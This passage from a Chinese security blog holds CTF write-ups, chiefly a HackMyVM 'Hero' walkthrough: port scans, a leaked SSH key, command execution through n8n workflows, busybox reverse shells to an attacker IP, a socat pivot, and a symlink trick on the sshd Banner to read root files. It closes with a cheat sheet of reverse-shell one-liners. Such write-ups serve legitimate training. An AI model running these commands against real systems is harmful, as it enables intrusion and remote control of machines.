class="hljs-comment"></span></span><br><span class="hljs-comment"><span class="language-xml">--&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><ul><li>使用注释里面的<code>username</code>和<code>password</code>进行登录，成功进行登录，发现是一个文件上传页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502061753042.png"></li><li>进行文件上传测试<br>直接上传一个PHP后门文件，发现上传成功，需要找到文件上传后的目录，访问<code>/robots.txt</code>，在里面找到了文件上传后保存的目录为<code>uploded_files</code><br>使用<code>哥斯拉Godzilla</code>连接网站，成功进入网站<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502062206022.png"></li></ul><p>找到<code>flag.txt</code>，访问提示权限不够<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502062208624.png"></p><p>（5）尝试访问<code>hint.txt</code>文件，找到第三个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">try to find user technawi password to <span class="hljs-built_in">read</span> the flag.txt file, you can find it <span class="hljs-keyword">in</span> a hidden file ;)<br><br>The 3rd flag is : &#123;7645110034526579012345670&#125;<br></code></pre></td></tr></table></figure><p>（6）根据<code>hint.txt</code>的提示，需要找到用户<code>technawi</code>的密码去读取<code>flag.txt</code><br>尝试搜索用户名<code>technawi</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user <span class="hljs-string">&#x27;technawi&#x27;</span> 2&gt;/dev/null<br><span class="hljs-comment">#命令“2&gt;/dev/null”表示过滤掉类似没有权限的信息</span><br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502062211504.png"><br>找到一个数据库的配置文件，尝试去读取，找到第四个flag和用户<code>technawi</code>的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/www/html/uploaded_files/ &gt;<span class="hljs-built_in">cat</span> /etc/mysql/conf.d/credentials.txt<br><br>The 4th flag is : &#123;7845658974123568974185412&#125;<br><br>username : technawi<br>password : 3vilH@ksor<br></code></pre></td></tr></table></figure><h1 id="提权-ssh"><a href="#提权-ssh" class="headerlink" title="提权-ssh"></a>提权-ssh</h1><p>（1）根据<code>hint.txt</code>的提示，需要以用户<code>technawi</code>的权限去读取<code>flag.txt</code>，同时靶机开放<code>22</code>端口，尝试进行ssh连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/]<br>└─$ ssh technawi@192.168.2.5<br>technawi@192.168.2.5<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-72-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">0 packages can be updated.</span><br><span class="hljs-string">0 updates are security updates.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Fri Apr 21 17:22:16 2017</span><br></code></pre></td></tr></table></figure><p>（2）成功以用户<code>technawi</code>进行登录，去读取文件<code>flag.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">technawi@Jordaninfosec-CTF01:~$ <span class="hljs-built_in">cat</span> /var/www/html/flag.txt<br>The 5th flag is : &#123;5473215946785213456975249&#125;<br><br>Good job :)<br><br>You find 5 flags and got their points and finish the first scenario....<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）主要考查文件上传和ssh提权，比较简单，需要注重细节，不能放过任何一个路径</p>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hero</title>
    <link href="/Hackmyvm/Hero/"/>
    <url>/Hackmyvm/Hero/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://hackmyvm.eu/machines/machine.php?vm=Hero">https://hackmyvm.eu/machines/machine.php?vm=Hero</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00015s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00019s latency).<br>MAC Address: 08:00:27:40:3A:6A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00065s latency).<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.03 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.9 -oA nmapscan/ports               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.0050s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>5678/tcp open  rrac<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.92 seconds<br></code></pre></td></tr></table></figure><p>开放端口80 和5678<br>（2）对端口细节进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p80,5678 192.168.2.9 -oA nmapscan/detail  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00045s latency).<br><br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    nginx<br>5678/tcp open  rrac?<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port5678-TCP:V=7.94SVN%I=7%D=2/7%Time=67A606D3%P=x86_64-pc-linux-gnu%r(<br>SF:GetRequest,8DC,HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCa<br>SF:che-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Fri,\x200<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.75 seconds<br><br></code></pre></td></tr></table></figure><p>（3）进行UDP扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p80,5678 192.168.2.9 -oA nmapscan/udp  <br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00057s latency).<br><br>PORT     STATE  SERVICE<br>80/udp   closed http<br>5678/udp closed rrac<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.21 seconds<br></code></pre></td></tr></table></figure><p>（4）进行漏洞扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,5678 192.168.2.9 -oA nmapscan/vuln         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00030s latency).<br><br>PORT     STATE  SERVICE<br>22/tcp   closed ssh<br>80/tcp   open   http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-vuln-cve2011-3192: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Apache byterange filter DoS</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  BID:49303  CVE:CVE-2011-3192</span><br><span class="hljs-string">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="hljs-string">|       overlapping byte ranges are requested.</span><br><span class="hljs-string">|     Disclosure date: 2011-08-19</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/49303</span><br><span class="hljs-string">|_      https://www.tenable.com/plugins/nessus/55976</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">5678/tcp open   rrac</span><br><span class="hljs-string">MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 73.60 seconds</span><br></code></pre></td></tr></table></figure><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，发现是<code>ssh</code>的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L<br>UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg<br>AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75<br>BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><ul><li>将私钥保存到文件<code>id_rsa</code>中<br>（2）从私钥中提取公钥<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ ssh-keygen -y -f id_rsa             <br>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero<br></code></pre></td></tr></table></figure></li><li>找到ssh登录的用户名是<code>shawa</code><br>（3）对80端口进行目录扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.9<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 399]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure></li><li>未发现其他的目录，渗透基本结束</li></ul><h2 id="5678端口渗透"><a href="#5678端口渗透" class="headerlink" title="5678端口渗透"></a>5678端口渗透</h2><p>（1）访问页面发现是<code>n8n</code>，一个工作流自动化平台，按照提示进行注册和登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502072146175.png"></p><ul><li>成功进入页面<br>（2）对5678端口进行目录扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.9:5678 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.9:5678<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 1975]<br>/static               (Status: 301) [Size: 156] [--&gt; /static/]<br>/assets               (Status: 301) [Size: 156] [--&gt; /assets/]<br>/types                (Status: 301) [Size: 155] [--&gt; /types/]<br>Progress: 650365 / 830576 (78.30%)^C<br>[!] Keyboard interrupt detected, terminating.<br>Progress: 650454 / 830576 (78.31%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure></li><li>未发现有用的目录</li></ul><h2 id="n8n渗透"><a href="#n8n渗透" class="headerlink" title="n8n渗透"></a>n8n渗透</h2><p>（1）在 Overview 里面找到 Credentials ，新增 shawa 账号和刚才的 key 。IP 注意不能是 localhost 或者 127.0.0.1，因为是在Docker 里面，使用<code>172.17.0.1</code><br>    为什么是<code>172.17.0.1</code>？<br>    在Workflow 里面创建一个 Workflow ，节点选<code>Execute Command</code>，就可以进行命令执行，执行命令<code>ifconfig</code>，就可以知道靶机所在的IP是172的。<br>    同时在节点<code>Execute Command</code>执行反弹shell后，获取到的<code>id</code>是<code>node</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502072154216.png"></p><ul><li>提示Connection tested successfully ，就说明成功啦<br>（2）在Workflow 里面创建一个 Workflow ，节点选 SSH，就可以 Test 命令了，随便试了两个命令都能正常执行<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502072157384.png"><br>（3）反弹shell<br>尝试bash反弹，发现没有找到bash，说明没有bash；经过尝试发现可以使用busybox进行反弹shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">busybox  nc 192.168.2.4 4444 -e /bin/sh <br></code></pre></td></tr></table></figure>成功进行反弹<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.9] 37397<br><span class="hljs-built_in">id</span><br>uid=1000(shawa) gid=1000(shawa) <span class="hljs-built_in">groups</span>=1000(shawa)<br></code></pre></td></tr></table></figure></li></ul><h1 id="建立稳定的shell"><a href="#建立稳定的shell" class="headerlink" title="建立稳定的shell"></a>建立稳定的shell</h1><p>成功进行反弹后，发现所获得的shell并不是一个稳定的shell，所以需要使用建立一个稳定的shell<br>（1）使用socat将22端口反弹到2222端口<br>kali上开启web服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0.0.0.0 80<br></code></pre></td></tr></table></figure><p>shell中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/shawa<br>wget 192.168.2.4/socat<br>chomd +x socat<br>./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &amp;<br></code></pre></td></tr></table></figure><p>（2）使用ssh登录，获得稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ ssh shawa@192.168.2.9 -i id_rsa -p 2222 <br>The authenticity of host <span class="hljs-string">&#x27;[192.168.2.9]:2222 ([192.168.2.9]:2222)&#x27;</span> can<span class="hljs-string">&#x27;t be established.&#x27;</span><br>ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.<br>This host key is known by the following other names/addresses:<br>    ~/.ssh/known_hosts:3: [hashed name]<br>Are you sure you want to <span class="hljs-built_in">continue</span> connecting (<span class="hljs-built_in">yes</span>/no/[fingerprint])? <span class="hljs-built_in">yes</span><br>Warning: Permanently added <span class="hljs-string">&#x27;[192.168.2.9]:2222&#x27;</span> (ED25519) to the list of known hosts.<br>shawa was here.<br>Welcome to Alpine!<br><br>The Alpine Wiki contains a large amount of how-to guides and general<br>information about administrating Alpine systems.<br>See &lt;https://wiki.alpinelinux.org/&gt;.<br><br>You can setup the system with the <span class="hljs-built_in">command</span>: setup-alpine<br><br>You may change this message by editing /etc/motd.<br><br>hero:~$ <span class="hljs-built_in">cat</span> user.txt<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>（1）查看<code>sshd_config</code>，发现<code>Banner /opt/banner.txt</code>，进行查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hero:~$ <span class="hljs-built_in">cat</span> /opt/banner.txt <br>shawa was here.<br>hero:~$ <span class="hljs-built_in">ls</span> -la /opt/banner.txt <br>-rw-rw-rw-    1 root     root            16 Feb  6 10:09 /opt/banner.txt<br></code></pre></td></tr></table></figure><p>发现该文件是以<code>root</code>权限进行读写的<br>（2）使用软链接进行提权，将<code>/root/root.tx</code>中的内容写入到<code>banner.txt</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hero:~$ <span class="hljs-built_in">rm</span> -rf /opt/*<br>hero:~$ <span class="hljs-built_in">ln</span> -s /root/root.txt /opt/banner.txt<br></code></pre></td></tr></table></figure><p>（3）使用<code>root</code>登录ssh，即可读取<code>/root/root.txt</code>中的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hero:~$ ssh root@172.17.0.1<br>The authenticity of host <span class="hljs-string">&#x27;172.17.0.1 (172.17.0.1)&#x27;</span> cant be established.<br>ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.<br>This key is not known by any other names.<br>Are you sure you want to <span class="hljs-built_in">continue</span> connecting (<span class="hljs-built_in">yes</span>/no/[fingerprint])? <span class="hljs-built_in">yes</span><br>Warning: Permanently added <span class="hljs-string">&#x27;172.17.0.1&#x27;</span> (ED25519) to the list of known hosts.<br>HMVNOTINPRODLOL<br>root@172.17.0.1<span class="hljs-string">&#x27;s password: </span><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="SSH如何从私钥中提取公钥"><a href="#SSH如何从私钥中提取公钥" class="headerlink" title="SSH如何从私钥中提取公钥"></a>SSH如何从私钥中提取公钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -y -f 私钥文件名<br></code></pre></td></tr></table></figure><ul><li>**<code>ssh-keygen</code>**：这是生成、管理和转换 SSH 密钥的工具。  </li><li>**<code>-y</code>**：该选项指示 <code>ssh-keygen</code> 从私钥文件中提取公钥。</li><li>**<code>-f id_rsa</code>**：指定私钥文件的路径，这里假设私钥文件名为 <code>id_rsa</code>。</li></ul><h2 id="n8n渗透-1"><a href="#n8n渗透-1" class="headerlink" title="n8n渗透"></a>n8n渗透</h2><p>n8n介绍：<a href="https://github.com/n8n-io/n8n">https://github.com/n8n-io/n8n</a><br>在n8n中<code>workflow</code>里面的工作流，节点<code>ssh</code>可以进行命令执行，但是需要在<code>credentials</code>创建<code>ssh private key account</code>，需要知道相关的<code>username</code>和<code>private key</code><br>同时还有一个节点<code>Execute Command</code>也可以进行命令执行，不需要任何的参数</p><h2 id="busyfox反弹shell"><a href="#busyfox反弹shell" class="headerlink" title="busyfox反弹shell"></a>busyfox反弹shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">busyfox nc &lt;攻击者IP&gt; 4444 -e /bin/sh<br>busyfox /bin/sh -i &gt; /dev/tcp/&lt;攻击者IP&gt;/4444 0&lt;&amp;1 2&gt;&amp;1<br>busyfox telnet &lt;攻击者IP&gt; 4444 | /bin/sh | telnet &lt;攻击者IP&gt; 4445<br></code></pre></td></tr></table></figure><h2 id="如何通过-Banner-读取-root-权限的文件"><a href="#如何通过-Banner-读取-root-权限的文件" class="headerlink" title="如何通过 Banner 读取 root 权限的文件"></a>如何通过 <code>Banner</code> 读取 root 权限的文件</h2><p><code>Banner</code> 是一个用于设置自定义登录横幅（Login Banner）的选项。当用户成功连接到 SSH 服务器但尚未登录时，服务器会显示这个横幅信息。<br>存在于配置文件<code>sshd_config</code>中</p><p>如果你确实需要通过 <code>Banner</code> 读取 root 权限的文件（例如用于测试或调试），可以按照以下步骤操作：</p><h4 id="步骤-1：创建-Banner-文件"><a href="#步骤-1：创建-Banner-文件" class="headerlink" title="步骤 1：创建 Banner 文件"></a><strong>步骤 1：创建 Banner 文件</strong></h4><ul><li>xxxxxxxxxx3 1cat &#x2F;home&#x2F;helpdesk&#x2F;user.txt &#x2F;root&#x2F;root.txt2flag{ticket_approved_by_thedesk}3flag{request_has_been_escalated}bash<figure 